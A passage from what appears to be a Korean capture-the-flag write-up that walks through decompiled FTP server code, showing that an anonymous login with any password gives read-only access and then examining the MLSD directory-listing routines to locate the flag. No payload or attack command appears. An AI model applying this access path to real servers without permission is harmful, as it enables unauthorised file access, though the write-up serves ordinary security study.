</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x58</span>) <span style="color:#f92672">=</span> v2;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; PASS-&gt;successful logon&#34;</span>, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20600</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;230 User logged in, proceed.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x1EuLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcasecmp</span>(v5, <span style="color:#e6db74">&#34;upload&#34;</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcasecmp</span>(v5, <span style="color:#e6db74">&#34;readonly&#34;</span>);
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v3 )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5078</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;530 This account is disabled.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x1FuLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>PASS 함수이다.
config 파일에서 유저의 비밀번호를 찾고 인증한다.
*면 어떤 비밀번호여도 체크가 패스된다.
아까 config 파일에서 있던 anonymous를 유저 이름으로 주고, 아무 비밀번호나 입력하면, ReadOnly 권한으로 ftp 서버에 접속할 수 있다.</p>
<p>이제 flag 이름을 읽기 위해서 ftp 명령어들을 구글링 해봤다.
MLSD가 나와서 그걸 분석해봤다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ftpMLSD</span>(<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>mutex, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> owner; <span style="color:#75715e">// edx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> align; <span style="color:#75715e">// rdi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_t</span> newthread; <span style="color:#75715e">// [rsp+8h] [rbp-C0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> stat64 v9; <span style="color:#75715e">// [rsp+10h] [rbp-B8h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// [rsp+A8h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  owner <span style="color:#f92672">=</span> mutex[<span style="color:#ae81ff">2</span>].__owner;
</span></span><span style="display:flex;"><span>  v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>owner )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mutex[<span style="color:#ae81ff">515</span>].__align )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;530 Please login with USER and PASS.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x26uLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mutex[<span style="color:#ae81ff">1</span>].__kind )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mutex[<span style="color:#ae81ff">515</span>].__align )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;550 Another action is in progress, use ABOR command first.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x3CuLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ftp_effective_path</span>((<span style="color:#66d9ef">__int64</span>)(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">105</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>), (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">3</span>], a2, <span style="color:#ae81ff">0x2000uLL</span>, <span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>]);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">stat64</span>(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>], <span style="color:#f92672">&amp;</span>v9);      <span style="color:#75715e">// get stat of file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  align <span style="color:#f92672">=</span> mutex[<span style="color:#ae81ff">515</span>].__align;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 <span style="color:#f92672">&amp;&amp;</span> (v9.st_mode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4000</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( align )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;150 File status okay; about to open data connection.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x36uLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; MLSD-LIST &#34;</span>, (<span style="color:#66d9ef">__int64</span>)a2);
</span></span><span style="display:flex;"><span>    mutex[<span style="color:#ae81ff">1</span>].__spins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(mutex);
</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>newthread, <span style="color:#ae81ff">0LL</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))mlsd_thread, mutex);
</span></span><span style="display:flex;"><span>    mutex[<span style="color:#ae81ff">1</span>].__kind <span style="color:#f92672">=</span> v7;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v7 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( mutex[<span style="color:#ae81ff">515</span>].__align )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;451 Requested action aborted. Local error in processing.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x3AuLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">1</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> newthread;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(mutex);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( align )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;550 File or directory unavailable.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x24uLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>mutex로 critical section을 하나의 쓰레드만 진입하도록 해준것 같다.
ftp_effective_path 함수로 경로를 얻어오고 stat으로 체크한다.
여기서 쓰레드로 mlsd_thread 함수를 호출한다. 첫번째 인자는 mutex 그대로 넘겨준다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">mlsd_thread</span>(<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DIR <span style="color:#f92672">*</span>v2; <span style="color:#75715e">// rbp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> dirent64 <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// rcx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> align; <span style="color:#75715e">// rdi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE fd[<span style="color:#ae81ff">12</span>]; <span style="color:#75715e">// [rsp+14h] [rbp-94h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __pthread_unwind_buf_t buf; <span style="color:#75715e">// [rsp+20h] [rbp-88h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  buf.__pad[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_lock</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">__sigsetjmp</span>((<span style="color:#66d9ef">struct</span> __jmp_buf_tag <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cleanup_handler</span>(a1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__pthread_unwind_next</span>(<span style="color:#f92672">&amp;</span>buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__pthread_register_cancel</span>(<span style="color:#f92672">&amp;</span>buf);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)fd <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">create_datasocket</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a1[<span style="color:#ae81ff">515</span>].__align <span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ftp_init_tls_session</span>(<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">4</span>], <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)fd, <span style="color:#ae81ff">0</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>]);         <span style="color:#75715e">// open dir
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> ( v2 )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir64</span>(v2);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v3 )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>          v1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mlsd_sub</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">310</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)fd, <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">4</span>], v3);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v1 )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!</span>a1[<span style="color:#ae81ff">1</span>].__spins );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">closedir</span>(v2);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">4</span>] )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_bye</span>(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_deinit</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; MLSD complete&#34;</span>, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>  align <span style="color:#f92672">=</span> a1[<span style="color:#ae81ff">515</span>].__align;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a1[<span style="color:#ae81ff">1</span>].__spins <span style="color:#f92672">&amp;&amp;</span> v1 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>align )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send</span>(a1[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;226 Transfer complete. Closing data connection.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x31uLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_18;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>align )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send</span>(a1[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;426 Connection closed; transfer aborted.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x2AuLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_18;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>LABEL_18:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)fd);
</span></span><span style="display:flex;"><span>    a1[<span style="color:#ae81ff">1</span>].__count <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> a1;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_19;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( align )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">send</span>(a1[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;451 Requested action aborted. Local error in processing.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x3AuLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> a1;
</span></span><span style="display:flex;"><span>LABEL_19:
</span></span><span style="display:flex;"><span>  v5[<span style="color:#ae81ff">1</span>].__kind <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__pthread_unregister_cancel</span>(<span style="color:#f92672">&amp;</span>buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_unlock</span>(v5);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>create_datasocket으로 데이터 소켓을 따로 연다.
그리고 opendir, readdir을 해주고 datasocket으로 결과를 보내준다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">mlsd_sub</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">int</span> a2, <span style="color:#66d9ef">__int64</span> a3, _BYTE <span style="color:#f92672">*</span>a4)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> v6; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> tm v7; <span style="color:#75715e">// [rsp+0h] [rbp-2118h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> stat64 v8; <span style="color:#75715e">// [rsp+40h] [rbp-20D8h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> file[<span style="color:#ae81ff">24</span>]; <span style="color:#75715e">// [rsp+D0h] [rbp-2048h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// [rsp+20D8h] [rbp-40h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( a4[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">46</span> <span style="color:#f92672">||</span> (result <span style="color:#f92672">=</span> <span style="color:#ae81ff">1LL</span>, a4[<span style="color:#ae81ff">20</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( a4[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">46</span> <span style="color:#f92672">||</span> a4[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">46</span> <span style="color:#f92672">||</span> (result <span style="color:#f92672">=</span> <span style="color:#ae81ff">1LL</span>, a4[<span style="color:#ae81ff">21</span>]) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__snprintf_chk</span>((<span style="color:#66d9ef">__int64</span>)file, <span style="color:#ae81ff">0x2000LL</span>, <span style="color:#ae81ff">1LL</span>, <span style="color:#ae81ff">0x2000LL</span>, <span style="color:#e6db74">&#34;%s/%s&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">lstat64</span>(file, <span style="color:#f92672">&amp;</span>v8) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">localtime_r</span>(<span style="color:#f92672">&amp;</span>v8.st_mtim.tv_sec, <span style="color:#f92672">&amp;</span>v7);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>v7.tm_mon;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__snprintf_chk</span>(
</span></span><span style="display:flex;"><span>          (<span style="color:#66d9ef">__int64</span>)file,
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">0x2000LL</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">1LL</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">0x2000LL</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;type=%s;%s=%llu;UNIX.mode=%lo;UNIX.owner=%lu;UNIX.group=%lu;modify=%u%02u%02u%02u%02u%02u; %s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(file);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( a3 )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
